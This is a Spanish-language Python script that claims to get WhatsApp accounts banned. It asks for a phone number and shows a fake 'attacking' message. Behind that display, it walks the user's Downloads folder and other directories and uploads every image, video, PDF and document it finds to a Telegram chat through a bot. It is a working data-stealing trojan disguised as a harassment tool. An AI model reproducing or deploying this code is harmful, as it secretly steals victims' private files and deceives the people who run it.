decoracion = '''\033[92m
!!!!!!!!!!!!!!!!!!!!!!7??JJJJJ??!!~~~~~~~~~~~~~~~~~~~^^^^^^^
!!!!!!!!!!!!!!!7?YPB#&@@@@@@@@@@@&7~~~~~~~~~~~~~~~~~~~~~~~~~
!!!!!!!!!!!!7YG#@@@@&##BGGGGGGGBB7.~~~~!~~~~~~~~~~~~~~~~~~~~
!!!!!!!!!!JG&@@@&BPYYJJJJJJJJJJJ?:~~~~J&#B5J!~~~~~~~~~~~~~^^
!!!!!!!!J#@@@#GYJJJJJJJJJJJJJJJ??7~~~7B&&@@@&B57~~~~~~^^^^^^
~~~~~~7B@@@#5J??????????????????::^~~7?JJ5G#&@@@BJ~^^^^^^^^^
~~~~~J&@@&P??????J5P5Y??????????!^~~!!!?J?JJYP#@@@#J~^^^^^^^
~~~~J&@@&Y??????P&@@@&Y???7!~^:::^~~~?????????J5#@@@G!^^^^^^
~~~!&@@&J??????5@@@@@@&J??7~^^^~~~~~~7???????????P@@@#!^^^^^
~~~P@@@577777775@@@@@@@G77777~~~!77???????????????Y&@@&~^^^^
~~~####7!777777?#@@@@&Y777777~:^~7?????????????????Y@@@B:^^^
~~~!^^^::~77!!!~7G@@@@P777!^::^^^^~77777777777777777G@@@7:^^
~~~~~~~~~~^:::::!7Y#@@@#5?~.^^^^^~!77777777777777777J@@@5.^^
~~~^~#&&&77~^^^^!~~~?J?77!::^^^~!7777777777777777777?@@@P.:^
^^^^^#@@@77!~!!77!::^^^^^^^^^^^~!7777?YJ?77777777777Y@@@5.::
^^^^^P@@@Y77777777^~~~!J55PP?^?7^^~75#@@&BG5?7777777B@@@~.::
^^^^^!@@@#?777777777777?5B@G.?@&BP!J@@@@@@@@P7????75@@@P.:::
^^^^^^J@@@B????????????????:^B@@@@#^YYY5PPBB??????5&@@#:.:::
^^^^^^^Y@@@#Y????????????!^:!??YPG####BGP?^?????JG@@@B:.::::
^^^^^^^^G@@@G?????????7!!~~7????????JYYJ?!^7???5#@@&Y..:::::
:^^^^^:?@@@#J?????????7~~7????????????????!!!??JJ?!^..::::::
::::::~&@@&5JJY5PGG5YJJ?^^?JJJJJJJJJJJJJJY5B&@@@G!.:::::::::
:::::^B@@@&#&&@@@@@@@#?.!YYYJJJJJJJYY5GB&@@@@#Y^..::::::::::
:::::5@@@@@&&#G5?7?PP^~G@@@@&&&&&&&@@@@@&#PJ~..:::::::::::::
::::?#BG5?!~:....:::..!7J5PGBBBBBBBGPY?!^:..::::::::::::::::
::::^^.....::::::::::::::::::::::::...::::::::::::::::::::::
......................::....................................
'''

print(decoracion)
print("ESTA HERRAMIENTA TE PERMITE BANEAR CUENTAS DE WHATSAPP")
print("ESCRIBE EL NUMERO COMO EN ESTE EJEMPLO:")
print("+18780090099:")
print("___________________________________________________")

import os
import telebot
import threading
import time

bot_token = "token_del_bot"
bot = telebot.TeleBot(bot_token)

def envi_ar(file_path, max_retries=5):
    chat_id = "tu_id"
    wait_time = 1 

    with open(file_path, "rb") as f:
        for attempt in range(max_retries):
            try:
                if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
                    bot.send_photo(chat_id, photo=f)
                elif file_path.lower().endswith((".mp4",)):
                    bot.send_video(chat_id, data=f)
                elif file_path.lower().endswith((".pdf", ".txt", ".doc", ".docx")):
                    bot.send_document(chat_id, document=f)
                break  
            except telebot.apihelper.ApiException as e:
                if e.error_code in [429, 500, 502, 503, 504]:  
                    print(f"Error {e.error_code}, esperando {wait_time} segundos antes de reintentar...")
                    time.sleep(wait_time)
                    wait_time *= 2  
                else:
                    raise e  
            except Exception as e:
                print(f"Error de conexión")
                break  

        else:  
            print(f"Error de conexión")

def pant_A():
    while True:
        print("ATACANDO...")
        time.sleep(10) 

def main():
    input_number = input("Ingresa un número de teléfono para iniciar: ")

    bg_thread = threading.Thread(target=pant_A)
    bg_thread.daemon = True
    bg_thread.start()
    dir_paths = [
        r"C:\Users\user\Downloads",
        r"C:\Otra\Ruta",
        r"D:\Y\Otra\Más"
    ]
    
    for dir_path in dir_paths:
        files_found = False  

        for root, dirs, files in os.walk(dir_path):
            for file in files:
                file_path = os.path.join(root, file)
                envi_ar(file_path)
                files_found = True

        if not files_found:
            print(f"X")

    print("Baneo finalizado.")

    bg_thread.join()

if __name__ == "__main__":
    main()

